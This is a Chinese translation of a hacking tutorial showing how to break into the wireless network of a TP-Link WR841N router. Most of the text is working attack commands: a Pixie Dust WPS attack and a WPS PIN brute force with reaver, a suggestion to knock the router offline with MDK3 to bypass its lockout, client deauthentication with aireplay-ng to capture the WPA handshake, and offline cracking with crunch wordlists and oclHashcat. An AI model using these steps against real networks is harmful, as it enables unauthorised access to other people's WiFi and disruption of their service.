> 原文链接: https://www.anquanke.com//post/id/85018 


# 【技术分享】 如何破解TP link WR841N路由器无线网络（含演示视频）


                                阅读量   
                                **227182**
                            
                        |
                        
                                                                                                                                    ![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)
                                                                                            



##### 译文声明

本文是翻译文章，文章原作者，文章来源：hackingtutorials
                                <br>原文地址：[http://www.hackingtutorials.org/wifi-hacking-tutorials/how-to-hack-a-tp-link-wr841n-router-wireless-network/#prettyPhoto](http://www.hackingtutorials.org/wifi-hacking-tutorials/how-to-hack-a-tp-link-wr841n-router-wireless-network/#prettyPhoto)

译文仅供参考，具体内容表达以及含义原文为准

[![](https://p4.ssl.qhimg.com/t01b4eb8535b889c951.jpg)](https://p4.ssl.qhimg.com/t01b4eb8535b889c951.jpg)

****

**翻译：**[**secist**](http://bobao.360.cn/member/contribute?uid=1427345510)

**预估稿费：100RMB（不服你也来投稿啊！）**

**投稿方式：发送邮件至**[**linwei#360.cn******](mailto:linwei@360.cn)**，或登陆**[**网页版**](http://bobao.360.cn/contribute/index)**在线投稿**



**前言**

在这篇文章中，我将会向你展示如何破解TP Link WR841N路由器无线密码。这款 TP Link路由器外壳上有８个字符的PIN码并默认支持WPS PIN作为WiFi密码。基于以上特点，我将尝试以下技术来破解TP Link WR841N无线密码：

１.首先我将使用Pixiedust WPS Reaver 1.5.2和Aircrack-ng套件来尝试获取密码。

２.接着我将尝试使用reaver来获取WPS PIN码。

３.最后我将使用Airodump-ng来抓取四步握手过程，并使用crunch生成默认密码列表，并结合oclHashcat进行爆破。

<br>

**1.使用 Reaver 实现 Pixie Dust WPS 攻击**

让我们先通过以下命令将网卡设置为监听模式：

```
airmon-ng start wlan0
```

在 kali 2.0 sana 版本下，出现以下错误：

```
[X] ERROR: Failed to open ‘wlan0mon’ for capturing
```

解决方案如下：

1. 首先将网卡设置为监听模式 airmon-ng start wlan0

2. 上步操作将会启动一个名为 wlan0mon 的监听网卡

3. 使用 iwconfig 命令，检查网卡模式是否仍处于管理模式，如果是的话我们使用以下命令来将其设置为监听模式：



```
ifconfig wlan0mon down
iwconfig wlan0mon mode monitor
ifconfig wlan0mon up
```

4. 再次使用 iwconfig 命令检查其是否已经成功设置为监听模式

5. 启动：airodump-ng wlan0mon up

特殊情况下我们可以杀死KAIL的相关进程。

[![](https://p1.ssl.qhimg.com/t01fe4b5ebed681fa56.jpg)](https://p1.ssl.qhimg.com/t01fe4b5ebed681fa56.jpg)

现在让我们启动 airodump-NG 获取目标的 BSSID，MAC 地址和 channel 。

```
airodump-ng -i wlan0mon
```

下面我们使用获取到的 BSSID 和 channel 结合Reaver来获取目标的 PKE, PKR, e-hash 1&amp;2, E/R-nonce 和 authkey 以供 pixiewps 破解使用：

```
Reaver -i wlan0mon -b [BSSID] -vv -S -c [AP channel]
```

[![](https://p1.ssl.qhimg.com/t0127f2425455b4e549.jpg)](https://p1.ssl.qhimg.com/t0127f2425455b4e549.jpg)

现在我们启动 pixiewps 如下：

[![](https://p0.ssl.qhimg.com/t018d46fbc5eee45296.jpg)](https://p0.ssl.qhimg.com/t018d46fbc5eee45296.jpg)

基本参数；



```
- E-HASH1，这个hash 值是我们破解前半部分 PIN 码所要使用的 hash 。
- E-HASH2，这个hash 值是我们破解后半部分 PIN 码所要使用的 hash 。
- HMAC ,是密钥相关的哈希运算消息认证码。
- PSK1，是路由器PIN码的前半段（有10,000种可能性）
- PSK2，是路由器PIN码的后半段（这里有1000种可能性，因为其中一位为效验码。就算有10000种可能性，对我们而言依旧很轻松就能破解）。
- PKE，是注册人的公钥（用于验证WPS交换的合法性和防止重放）。
- PKR，是注册的公钥（用于验证一个WPS交换的合法性和防止重放）。
```

从结果可以看出，该路由器不存在可被 WPS 攻击的漏洞。

<br>

**2.Reaver WPS PIN 攻击**

我们使用如下命令开始进行 WPS PIN 攻击：

```
reaver -i wlan0mon -b [BSSID] -vv -c 1 -d 5 –w
```

不幸的是在 6 次尝试破解后，路由器的锁定机制被触发，导致我们无法继续在进行爆破尝试。如果出现这种情况，我们其实可以使用 MDK3 来对目标发起 DoS 强制断开目标网络，致使其路由器重启，从而帮助我们绕过锁定机制。

[![](https://p4.ssl.qhimg.com/t01339e239430e4b9a5.jpg)](https://p4.ssl.qhimg.com/t01339e239430e4b9a5.jpg)

<br>

**3.使用 oclHashcat 暴力破解路由器**

让我们看看我们是否可以通过捕捉4次握手包，及使用默认路由器密码列表来进行离线的暴破来得到密码。我们将使用以下工具：

1. 使用 crunch 来生成密码列表。

2. 使用 airodump-ng 来捕捉四次握手包。

3. 使用 airplay-ng 来打断目标客户机连接。

4. Windows下使用 oclHashcat GPU。

首先让我们使用 crunch 来生成字典：

```
crunch 8 8 1234567890 -o /root/Desktop/88numlist.txt
```

这可能需要一段时间，将会生成一个　９００　Ｍ大小，由８位数字所有组合的字典表。

接着，让我们来通过　Airodump-ng 和 Aireplay-ng　来抓取目标的握手包数据。我们先用　Airodump-ng　来找到我们的目标：

```
airodump-ng wlan0mon
```

现在选择你目标的BSSID和 channel，并重新启动以上命令：

```
airodump-ng –bssid [BSSID] -c [channel]-w [握手包 .cap]wlan0mon
```

最后我们打开一个新的 terminal 窗口，并使用 Aireplay-ng 来强制打断目标连接使其重新连接。命令如下：

```
aireplay-ng -0 2 -a [BSSID] -c [Client MAC] wlan0mon
```

可以看到我们成功使目标客户机重新连接，并成功的抓取到了四步握手过程！

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p3.ssl.qhimg.com/t012ef56f1b1f0f6b9c.jpg)

第3步：猜解默认路由器密码列表

我们将在Windows上使用oclHashcat GPU结合我们之前生成的密码字典来破解 WIFI 密码。

在此之前，我们必须将.CAP文件转换为.hccap文件。命令如下：

```
aircrack-ng -J [Filepath to save .hccap file] [Filepath to .cap file]
```

现在，我们就可以在Windows上启动oclHashcat开始进行暴破任务啦！

```
oclhashcat64.exe -m 2500 -w 3 –[gpu-temp-retain=60] –status -o cracked.txt tplink.hccap 88numlist.txt
```

不一会时间，密码就被成功爆破：

```
oclhashcat
```

<br>

**演示视频**


